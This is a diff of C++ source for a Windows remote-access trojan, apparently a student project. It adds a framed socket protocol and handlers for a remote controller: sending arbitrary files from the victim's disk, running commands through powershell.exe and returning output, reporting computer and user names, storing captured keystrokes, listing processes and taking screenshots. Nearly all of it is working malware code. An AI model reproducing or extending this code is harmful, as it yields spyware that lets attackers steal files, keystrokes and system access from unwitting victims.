@@ -7,6 +7,9 @@ email: forec@bupt.edu.cn
 #include "trojan.h"
 
 HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);
+HHOOK hook = NULL;
+char keyBuffer[KEY_BUFLEN]; 
+char temp[MAXLEN + 4];
 
 inline LPCWSTR stringToLPCWSTR(const char *src){
 	size_t srcsize = strlen(src) + 1;
@@ -16,16 +19,30 @@ inline LPCWSTR stringToLPCWSTR(const char *src){
 	return wcstring;
 }
 
-unsigned int send_s(SOCKET &sock, char *buf, INT32 sendlen){
-	char * temp = new char[sendlen + 4];
+int send_s(SOCKET &sock, const char *buf, INT32 sendlen){
 	/* content check */
 	memcpy(temp, "FLAG", 4);
 	if (buf){
 		memcpy(temp + 4, buf, sendlen);
 	}
 	int realSendLen = send(sock, temp, sendlen + 4, 0);
-	delete temp;
+	if (realSendLen == SOCKET_ERROR)
+		return SOCKET_ERROR;
 	return realSendLen - 4 >= 0 ? realSendLen : 0;
+}
+
+int recv_s(SOCKET &sock, char *buf, unsigned int buflen){
+	memset(buf, 0, buflen);
+	int recvLen = recv(sock, temp, buflen + 4, 0);
+	if (recvLen == SOCKET_ERROR)
+		return SOCKET_ERROR;
+	if (recvLen < 4 || strncmp(temp, "FLAG", 4) != 0){
+		return 0;
+	}
+	else{
+		memcpy(buf, temp + 4, recvLen - 4);
+		return recvLen - 4;
+	}
 }
 
 unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen){	// server
@@ -39,17 +56,33 @@ unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen){	// serv
 	return index;
 }
 
-bool sendFile(SOCKET &socket, char *path){
+bool sendFile(SOCKET &socket, const char *path){
 	FILE *fp;
 	int error = fopen_s(&fp, path, "rb");
-	if (error != 0)
+	if (error != 0){
+		send_s(socket, "OPENFAIL", 9);
 		return false;
+	}else{
+		fseek(fp, 0, SEEK_END);
+		long length = ftell(fp);
+		fseek(fp, 0, SEEK_SET);
+		char filelength[21] = "OPENSUCC";
+		memcpy(filelength + 8, (void*)&length, 8);
+		send_s(socket, filelength, 17);
+	}
 	char send_buf[SEND_BUFLEN];
 	unsigned int readLen = 0;
 	do {
+		if (SOCKET_ERROR == recv_s(socket, NULL, 0)){
+			fclose(fp);
+			return false;
+		}
 		readLen = readFileIntoBuf(&fp, send_buf, SEND_BUFLEN);
-		send_s(socket, send_buf, readLen);
-	} while (readLen);
+		if (SOCKET_ERROR == send_s(socket, send_buf, readLen)){
+			fclose(fp);
+			return false;
+		}
+	} while (readLen != SOCKET_ERROR && readLen != 0);
 	fclose(fp);
 	return true;
 }
@@ -284,7 +317,7 @@ HWND CreateTrojanWindow(HINSTANCE hInstance){
 	hwnd = CreateWindowEx(
 		WS_EX_CLIENTEDGE,
 		stringToLPCWSTR(g_szClassName),
-		TEXT("Trojan"),
+		TEXT("trojan"),
 		WS_OVERLAPPEDWINDOW,
 		CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
 		NULL, NULL, hInstance, NULL);
@@ -313,7 +346,6 @@ DWORD WINAPI ThreadProc(LPVOID lpThreadParameter){
 	if (!hook){
 		return -1;
 	}
-
 	while (GetMessage(&Msg, NULL, 0, 0) > 0){
 		TranslateMessage(&Msg);
 		DispatchMessage(&Msg);
@@ -334,17 +366,20 @@ bool getCurrentProcesses(char *buf, const unsigned int buflen) {
 		return false;
 	}
 	memset(buf, 0, buflen);
-	do {
-		sprintf_s(buf + strlen(buf),
-			buflen,
-			"%s\t %u\t %d\t %d\t %u\n",
+	char temp[101];
+	while (Process32Next(shot, &pe32)){
+		memset(temp, 0, 101);
+		sprintf_s(temp,
+			101,
+			"%ws\t %u\t %d\t %d\t %u\n",
 			pe32.szExeFile,
 			pe32.th32ParentProcessID,
 			pe32.cntThreads,
 			pe32.pcPriClassBase,
 			pe32.th32ProcessID
 			);
-	} while (Process32Next(shot, &pe32));
+		strcat_s(buf, buflen, temp);
+	}
 	CloseHandle(shot);
 	return true;
 }
@@ -360,7 +395,7 @@ bool runCommand(char *cmdStr, SOCKET &sock){
 	PROCESS_INFORMATION pi; // process info
 	SECURITY_ATTRIBUTES sa; // tunnel security
 
-	sprintf_s(command, CMD_BUFLEN, "cmd.exe /c %s", cmdStr);
+	sprintf_s(command, CMD_BUFLEN, "powershell.exe /c %s", cmdStr);
 
 	sa.nLength = sizeof(sa);
 	sa.bInheritHandle = TRUE;
@@ -394,7 +429,8 @@ bool runCommand(char *cmdStr, SOCKET &sock){
 		return false;
 	}
 	CloseHandle(hWrite);
-
+	if (SOCKET_ERROR == send_s(sock, NULL, 0))
+		return false;
 	while (ReadFile(hRead, cmd_buf + bsize, CMD_BUFLEN - bsize, &readByte, NULL)){
 		if (!readByte){
 			if (first)
@@ -403,17 +439,26 @@ bool runCommand(char *cmdStr, SOCKET &sock){
 		}
 		bsize = strlen(cmd_buf);
 		if (bsize == CMD_BUFLEN){
-			send_s(sock, cmd_buf, bsize + 1);
+			if (SOCKET_ERROR == recv_s(sock, NULL, 0))
+				return false;
+			if (SOCKET_ERROR == send_s(sock, cmd_buf, bsize + 1))
+				return false;
 			memset(cmd_buf, 0, bsize);
 			bsize = 0;
 		}
 	}
 	if (bsize > 0){
-		send_s(sock, cmd_buf, bsize + 1);
+		if (SOCKET_ERROR == recv_s(sock, NULL, 0))
+			return false;
+		if (SOCKET_ERROR == send_s(sock, cmd_buf, bsize + 1))
+			return false;
 		memset(cmd_buf, 0, bsize);
 		bsize = 0;
 	}
-	send_s(sock, NULL, 0);
+	if (SOCKET_ERROR == recv_s(sock, NULL, 0))
+		return false;
+	if (SOCKET_ERROR == send_s(sock, NULL, 0))
+		return false;
 	CloseHandle(hRead);
 	return true;
 }
@@ -453,21 +498,19 @@ bool sendSystemInfo(SOCKET &socket){
 				strcpy_s(temp, INFO_BUFLEN, "Windows 2000");
 		}
 	}
-	sprintf_s(info, INFO_BUFLEN, "version: %s", temp);
+	if (strcmp(temp, "Unknown")){
+		sprintf_s(info, INFO_BUFLEN, "version: %s", temp);
+	}
 	memset(temp, 0, INFO_BUFLEN);
 
-	if (!GetComputerName((LPWSTR)temp, &namesize)){
-		strcpy_s(temp, INFO_BUFLEN, "Unknown");
+	if (GetComputerName((LPWSTR)temp, &namesize)){
+		sprintf_s(info, INFO_BUFLEN, "%s PC:%ws", info, temp);
 	}
-	strcat_s(info, INFO_BUFLEN, "\nPC :");
-	strcat_s(info, INFO_BUFLEN, temp);
 	memset(temp, 0, INFO_BUFLEN);
 
-	if (!GetUserName((LPWSTR)temp, &namesize)){
-		strcpy_s(temp, INFO_BUFLEN, "Unknown");
+	if (GetUserName((LPWSTR)temp, &namesize)){
+		sprintf_s(info, INFO_BUFLEN, "%s User:%ws", info, temp);
 	}
-	strcat_s(info, INFO_BUFLEN, "\nUser: ");
-	strcat_s(info, INFO_BUFLEN, temp);
 
 	if (send_s(socket, info, strlen(info) + 1) != SOCKET_ERROR)
 		return true;
@@ -478,21 +521,22 @@ bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET& socket){
 	WaitForSingleObject(hMutex, INFINITE);
 
 	memset(sendBuf, 0, SEND_BUFLEN);
-	if (!strncmp(recvBuf, "GETFILE", 7)){
+	if (!strncmp(recvBuf, "GETFILE", 7)){			// bug left
 		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 7, recvLen - 7);
 		return sendFile(socket, sendBuf);
 	}
-	else if (!strncmp(recvBuf, "RUNCMD", 6)){
+	else if (!strncmp(recvBuf, "RUNCMD", 6)){		// finished
 		strncpy_s(sendBuf, SEND_BUFLEN, recvBuf + 6, recvLen - 6);
 		return runCommand(sendBuf, socket);
 	}
-	else if (!strncmp(recvBuf, "PCINFO", 6)){
+	else if (!strncmp(recvBuf, "PCINFO", 6)){		// finished
 		return sendSystemInfo(socket);
 	}
-	else if (!strncmp(recvBuf, "KEYBOARD", 8)){
+	else if (!strncmp(recvBuf, "KEYBOARD", 8)){		// finished
 		FILE *fp;
 		int error = fopen_s(&fp, keyboard_save_file, "a");
 		if (error != 0){
+			send_s(socket, "KEYBOARD FAILED", strlen("KEYBOARD FAILED") + 1);
 			return false;
 		}
 		fprintf(fp, "%s", keyBuffer);
@@ -500,9 +544,10 @@ bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET& socket){
 		fclose(fp);
 		memset(keyBuffer, 0, KEY_BUFLEN);
 		sprintf_s(sendBuf, SEND_BUFLEN, "type %s", keyboard_save_file);
-		return runCommand(sendBuf, socket);
+		send_s(socket, "KEYBOARD SUCCEED", strlen("KEYBOARD SUCCEED") + 1);
+		return true;
 	}
-	else if (!strncmp(recvBuf, "PSLIST", 6)){
+	else if (!strncmp(recvBuf, "PSLIST", 6)){		// finished
 		if (getCurrentProcesses(sendBuf, SEND_BUFLEN)){
 			return send_s(socket, sendBuf, strlen(sendBuf) + 1) > 0 ? true : false;
 		}
@@ -510,7 +555,7 @@ bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET& socket){
 			return false;
 		}
 	}
-	else if (!strncmp(recvBuf, "SCREENSHOT", 10)){
+	else if (!strncmp(recvBuf, "SCREENSHOT", 10)){		// finished
 		if (getScreenShot(screenshot_save_file)){
 			send_s(socket, "SCREENSHOT SUCCEED", strlen("SCREENSHOT SUCCEED") + 1);
 			return true;
